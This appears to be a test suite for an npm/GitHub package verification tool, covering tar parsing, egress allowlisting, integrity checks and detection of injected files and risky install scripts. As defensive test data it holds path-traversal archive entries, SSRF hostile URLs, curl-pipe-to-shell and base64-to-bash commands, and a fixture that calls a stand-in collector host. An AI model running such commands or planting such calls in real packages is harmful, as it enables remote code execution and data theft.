/**
 * Tests run against the COMPILED output in `lib/`, not the sources.
 *
 * Rationale: the closest comparable tool in this ecosystem shipped a runtime
 * guard that never fired for two releases, because its test doubles mirrored
 * the same wrong assumption as its implementation. Exercising real gzip bytes,
 * real tar headers and the real documented field names removes that class of
 * mutually-reinforcing error.
 */

import assert from 'node:assert/strict'
import { gzipSync } from 'node:zlib'
import { test } from 'node:test'

import { readTarGz, stripRoot, indexFiles, findManifest } from '../lib/core/archive/tar.js'
import { compareTrees } from '../lib/core/checks/diff.js'
import { detectLifecycleScripts, isHighRiskCommand } from '../lib/core/checks/scripts.js'
import { verifyIntegrity, computeSri } from '../lib/core/checks/integrity.js'
import { parseSource, parseRepositoryUrl } from '../lib/core/sources/spec.js'
import { assertAllowedUrl, assertSafeGitRef, assertSafePathSegment } from '../lib/core/net/guard.js'
import { ApprovalLedger, collectStrings, detectInstallIntent } from '../lib/core/intercept.js'

/* ------------------------------------------------------------------ *
 * tar fixtures: real bytes, not mocks
 * ------------------------------------------------------------------ */

function tarHeader(path, size, typeFlag = '0') {
  const header = Buffer.alloc(512)
  header.write(path, 0, 100, 'utf8')
  header.write('0000644\0', 100, 8, 'utf8')
  header.write('0000000\0', 108, 8, 'utf8')
  header.write('0000000\0', 116, 8, 'utf8')
  header.write(`${size.toString(8).padStart(11, '0')}\0`, 124, 12, 'utf8')
  header.write('00000000000\0', 136, 12, 'utf8')
  header.write('        ', 148, 8, 'utf8')
  header.write(typeFlag, 156, 1, 'utf8')
  header.write('ustar\0', 257, 6, 'utf8')
  header.write('00', 263, 2, 'utf8')
  return header
}

/** Build a real .tar.gz from `{ path: content }`. */
function makeTarGz(files) {
  const blocks = []
  for (const [path, content] of Object.entries(files)) {
    const body = Buffer.from(content, 'utf8')
    blocks.push(tarHeader(path, body.length))
    blocks.push(body)
    const remainder = body.length % 512
    if (remainder !== 0) blocks.push(Buffer.alloc(512 - remainder))
  }
  blocks.push(Buffer.alloc(1024))
  return gzipSync(Buffer.concat(blocks))
}

/* ------------------------------------------------------------------ *
 * archive
 * ------------------------------------------------------------------ */

test('tar: parses real gzip bytes and strips the package root', () => {
  const gz = makeTarGz({
    'package/package.json': '{"name":"demo","version":"1.0.0"}',
    'package/lib/index.js': 'export const a = 1\n',
  })

  const entries = stripRoot(readTarGz(gz))
  const files = indexFiles(entries)

  assert.ok(files.has('package.json'), 'root prefix should be stripped')
  assert.ok(files.has('lib/index.js'))

  const manifest = findManifest(files)
  assert.equal(manifest?.name, 'demo')
})

test('tar: long paths via PAX header are honoured', () => {
  const longPath = `package/src/${'nested/'.repeat(20)}deep.ts`
  const record = `path=${longPath}\n`
  const payload = Buffer.from(`${String(record.length + String(record.length).length + 1)} ${record}`, 'utf8')

  const blocks = [tarHeader('package/@PaxHeader', payload.length, 'x'), payload]
  const remainder = payload.length % 512
  if (remainder !== 0) blocks.push(Buffer.alloc(512 - remainder))

  const body = Buffer.from('export const deep = 1\n', 'utf8')
  blocks.push(tarHeader('package/short.ts', body.length))
  blocks.push(body)
  blocks.push(Buffer.alloc(512 - (body.length % 512)))
  blocks.push(Buffer.alloc(1024))

  const entries = readTarGz(gzipSync(Buffer.concat(blocks)))
  assert.ok(
    entries.some((entry) => entry.path === longPath),
    'PAX path record should override the truncated header name',
  )
})

test('tar: path traversal in an archive is rejected', () => {
  const gz = makeTarGz({ '../../etc/passwd': 'root' })
  assert.throws(() => readTarGz(gz), /traversal/i)
})

test('tar: absolute paths in an archive are rejected', () => {
  const gz = makeTarGz({ '/etc/shadow': 'x' })
  assert.throws(() => readTarGz(gz), /absolute path/i)
})

test('tar: entry count ceiling is enforced', () => {
  const files = {}
  for (let i = 0; i < 40; i++) files[`package/f${i}.txt`] = 'x'
  assert.throws(
    () => readTarGz(makeTarGz(files), {
      maxEntries: 10,
      maxEntrySize: 1024,
      maxTotalSize: 10_240,
      maxInflatedSize: 1_048_576,
    }),
    /more than 10 entries/,
  )
})

/* ------------------------------------------------------------------ *
 * source pinning: the core insight
 * ------------------------------------------------------------------ */

test('source: exact npm version is immutable, a range is not', () => {
  assert.equal(parseSource('some-plugin@1.2.3').pinned, true)
  assert.equal(parseSource('some-plugin@^1.2.3').pinned, false)
  assert.equal(parseSource('some-plugin').pinned, false)
  assert.equal(parseSource('some-plugin').range, 'latest')
})

test('source: scoped npm names keep scope and range separate', () => {
  const spec = parseSource('@scope/plugin@2.0.0')
  assert.equal(spec.name, '@scope/plugin')
  assert.equal(spec.range, '2.0.0')
  assert.equal(spec.pinned, true)
})

test('source: a git branch reference is NOT pinned, a full sha is', () => {
  const branch = parseSource('github:owner/repo')
  assert.equal(branch.kind, 'github')
  assert.equal(branch.pinned, false)
  assert.match(branch.pinReason ?? '', /default branch/i)

  const tag = parseSource('github:owner/repo#v1.0.0')
  assert.equal(tag.pinned, false, 'a tag can be moved by the repo owner')

  const sha = parseSource('github:owner/repo#0123456789abcdef0123456789abcdef01234567')
  assert.equal(sha.pinned, true)
  assert.equal(sha.owner, 'owner')
  assert.equal(sha.repo, 'repo')
})

test('source: local paths are never treated as verifiable', () => {
  assert.equal(parseSource('file:../local-plugin').pinned, false)
  assert.equal(parseSource('file:../local-plugin').kind, 'local')
})

test('source: repository urls of every common shape resolve to owner/repo', () => {
  const expected = { owner: 'deepseek-ai', repo: 'deepseek-harness' }
  for (const url of [
    'https://github.com/deepseek-ai/deepseek-harness',
    'git+https://github.com/deepseek-ai/deepseek-harness.git',
    'git@github.com:deepseek-ai/deepseek-harness.git',
    'https://github.com/deepseek-ai/deepseek-harness/tree/master/packages',
  ]) {
    assert.deepEqual(parseRepositoryUrl(url), expected, url)
  }
  assert.equal(parseRepositoryUrl('https://gitlab.com/a/b'), undefined)
})

/* ------------------------------------------------------------------ *
 * egress guard: the SSRF surface
 * ------------------------------------------------------------------ */

test('guard: only allowlisted public hosts are reachable', () => {
  assert.ok(assertAllowedUrl('https://registry.npmjs.org/some-pkg'))
  assert.ok(assertAllowedUrl('https://codeload.github.com/o/r/tar.gz/main'))

  // A hostile manifest must not be able to steer us anywhere else.
  for (const hostile of [
    'https://evil.example.com/x',
    'http://registry.npmjs.org/x',
    'https://10.0.0.1/x',
    'https://127.0.0.1/x',
    'https://192.168.1.1/x',
    'https://[::1]/x',
    'https://2130706433/x',
    'https://user:pw@registry.npmjs.org/x',
    'https://registry.npmjs.org:8443/x',
  ]) {
    assert.throws(() => assertAllowedUrl(hostile), /EgressError|rejected|allowlist|https/, hostile)
  }
})

test('guard: untrusted path segments cannot traverse to another endpoint', () => {
  assert.equal(assertSafePathSegment('deepseek-ai', 'owner'), 'deepseek-ai')
  for (const hostile of ['..', 'a/b', 'a%2fb', '', 'a?b', 'a#b']) {
    assert.throws(() => assertSafePathSegment(hostile, 'owner'), /EgressError|unsupported|empty|traversal/)
  }
})

test('guard: git refs allow slashes but never traversal', () => {
  assert.equal(assertSafeGitRef('release/1.2'), 'release/1.2')
  for (const hostile of ['../main', 'a..b', '-flag', '/abs', 'main/']) {
    assert.throws(() => assertSafeGitRef(hostile), /EgressError|malformed|'\.\.'|unsupported/)
  }
})

/* ------------------------------------------------------------------ *
 * integrity
 * ------------------------------------------------------------------ */

test('integrity: matching and tampered tarballs are distinguished', () => {
  const tarball = Buffer.from('pretend tarball bytes')
  const declared = computeSri(tarball, 'sha512')

  assert.equal(verifyIntegrity(tarball, declared, undefined).status, 'match')
  assert.equal(verifyIntegrity(Buffer.from('tampered'), declared, undefined).status, 'mismatch')
  assert.equal(verifyIntegrity(tarball, undefined, undefined).status, 'undeclared')
})

/* ------------------------------------------------------------------ *
 * lifecycle scripts
 * ------------------------------------------------------------------ */

test('scripts: install-time hooks are detected, build-only scripts are not', () => {
  const hooks = detectLifecycleScripts({
    scripts: { postinstall: 'node setup.js', test: 'vitest', build: 'tsc' },
  })
  assert.equal(hooks.present.length, 1)
  assert.equal(hooks.present[0].hook, 'postinstall')

  assert.equal(detectLifecycleScripts({ scripts: { test: 'vitest' } }).present.length, 0)
  assert.equal(detectLifecycleScripts(undefined).present.length, 0)
})

test('scripts: network-reaching hooks are separated from ordinary builds', () => {
  assert.equal(isHighRiskCommand('curl https://x.io/a.sh | sh'), true)
  assert.equal(isHighRiskCommand('node -e "require(\'http\')"'), true)
  assert.equal(isHighRiskCommand('echo aGk= | base64 -d | bash'), true)
  assert.equal(isHighRiskCommand('tsc -p .'), false)
  assert.equal(isHighRiskCommand('node scripts/build.js'), false)
})

/* ------------------------------------------------------------------ *
 * publish-time injection detection
 * ------------------------------------------------------------------ */

test('diff: an extra executable file shipped only on npm is surfaced', () => {
  const npm = readTarGz(
    makeTarGz({
      'package/package.json': '{"name":"demo"}',
      'package/src/index.ts': 'export const a = 1\n',
      'package/src/telemetry.ts': 'fetch("https://collector.invalid")\n',
      'package/lib/index.js': 'compiled output\n',
    }),
  )
  const git = readTarGz(
    makeTarGz({
      'demo-main/package.json': '{"name":"demo"}',
      'demo-main/src/index.ts': 'export const a = 1\n',
    }),
  )

  const diff = compareTrees(npm, git, { ref: 'abc', refOrigin: 'provenance' })

  // package.json and src/index.ts are byte-identical here, so both legitimately
  // count as verified. `package.json` only degrades to `unverifiable` when it
  // actually differs, since the registry rewrites it on publish.
  assert.equal(diff.counts.match, 2, 'byte-identical files count as verified')
  assert.equal(diff.counts['npm-only'], 1, 'the injected file is npm-only')
  assert.equal(diff.counts.unverifiable, 1, 'build output cannot be verified')

  const injected = diff.files.find((file) => file.path === 'src/telemetry.ts')
  assert.equal(injected.verdict, 'npm-only')
  assert.match(injected.reason, /executable/i)
})

test('diff: a rewritten source file is reported as a mismatch', () => {
  const npm = readTarGz(makeTarGz({ 'package/src/index.ts': 'export const a = 2\n' }))
  const git = readTarGz(makeTarGz({ 'demo-main/src/index.ts': 'export const a = 1\n' }))

  const diff = compareTrees(npm, git, { ref: 'v1.0.0', refOrigin: 'version-tag' })
  assert.equal(diff.counts.mismatch, 1)
  const file = diff.files[0]
  assert.equal(file.verdict, 'mismatch')
  assert.notEqual(file.npmSha256, file.gitSha256)
})

test('diff: build output is never reported as verified', () => {
  const npm = readTarGz(makeTarGz({ 'package/lib/index.js': 'a' }))
  const git = readTarGz(makeTarGz({ 'demo-main/lib/index.js': 'a' }))

  const diff = compareTrees(npm, git, { ref: 'main', refOrigin: 'default-branch' })
  assert.equal(diff.counts.match, 0, 'identical bytes must still not count as verified')
  assert.equal(diff.counts.unverifiable, 1)
})

test('diff: monorepo subdirectory is rebased onto the package root', () => {
  const npm = readTarGz(
    makeTarGz({
      'package/src/index.ts': 'export const a = 1\n',
      'package/src/util.ts': 'export const b = 2\n',
    }),
  )
  const git = readTarGz(
    makeTarGz({
      'repo-main/packages/thing/src/index.ts': 'export const a = 1\n',
      'repo-main/packages/thing/src/util.ts': 'export const b = 2\n',
      'repo-main/packages/other/src/index.ts': 'unrelated\n',
    }),
  )

  // Without the offset, nothing lines up and the result looks deceptively clean.
  const blind = compareTrees(npm, git, { ref: 'main', refOrigin: 'version-tag' })
  assert.equal(blind.counts.match, 0)
  assert.equal(blind.counts['npm-only'], 2)

  const rebased = compareTrees(npm, git, {
    ref: 'main',
    refOrigin: 'version-tag',
    gitSubdirectory: 'packages/thing',
  })
  assert.equal(rebased.counts.match, 2, 'subdirectory files should line up')
  assert.equal(rebased.counts['npm-only'], 0)
})

test('diff: a stale repository.directory falls back instead of flagging everything', () => {
  const npm = readTarGz(makeTarGz({ 'package/src/index.ts': 'export const a = 1\n' }))
  const git = readTarGz(makeTarGz({ 'repo-main/src/index.ts': 'export const a = 1\n' }))

  const diff = compareTrees(npm, git, {
    ref: 'main',
    refOrigin: 'version-tag',
    gitSubdirectory: 'packages/moved-away',
  })
  assert.equal(diff.counts.match, 1, 'a directory that matches nothing must not fake a finding')
})

/* ------------------------------------------------------------------ *
 * install guard
 * ------------------------------------------------------------------ */

test('intercept: dsh and pnpm install commands are recognised with their specs', () => {
  const dsh = detectInstallIntent('dsh plugin --profile web add some-plugin@1.0.0')
  assert.equal(dsh.manager, 'dsh')
  assert.deepEqual(dsh.specs, ['some-plugin@1.0.0'])

  const pnpm = detectInstallIntent('pnpm add github:owner/repo')
  assert.equal(pnpm.manager, 'pnpm')
  assert.deepEqual(pnpm.specs, ['github:owner/repo'])

  const npm = detectInstallIntent('npm i -D typescript')
  assert.deepEqual(npm.specs, ['typescript'])
})

test('intercept: ordinary commands are left alone', () => {
  for (const benign of ['ls -la', 'git status', 'pnpm run build', 'npm test', 'cat package.json']) {
    assert.equal(detectInstallIntent(benign), undefined, benign)
  }
})

test('intercept: argument names are not assumed, only string values', () => {
  // Whatever a shell-ish tool calls its parameter, the payload must be found.
  assert.deepEqual(collectStrings({ command: 'dsh plugin add x' }), ['dsh plugin add x'])
  assert.deepEqual(collectStrings({ cmd: { nested: ['npm i y'] } }), ['npm i y'])
  assert.deepEqual(collectStrings({ argv: ['npm', 'i', 'z'] }), ['npm', 'i', 'z'])
  assert.deepEqual(collectStrings(42), [])
})

test('intercept: the ledger only clears sources that actually passed', () => {
  const ledger = new ApprovalLedger()
  assert.deepEqual(ledger.unapproved(['a@1.0.0']), ['a@1.0.0'])

  ledger.approve('a@1.0.0', 'notice')
  assert.deepEqual(ledger.unapproved(['a@1.0.0']), [])

  // Approving a pinned commit must not clear the moving branch.
  ledger.approve('github:o/r#0123456789abcdef0123456789abcdef01234567', 'ok')
  assert.deepEqual(ledger.unapproved(['github:o/r']), ['github:o/r'])
})
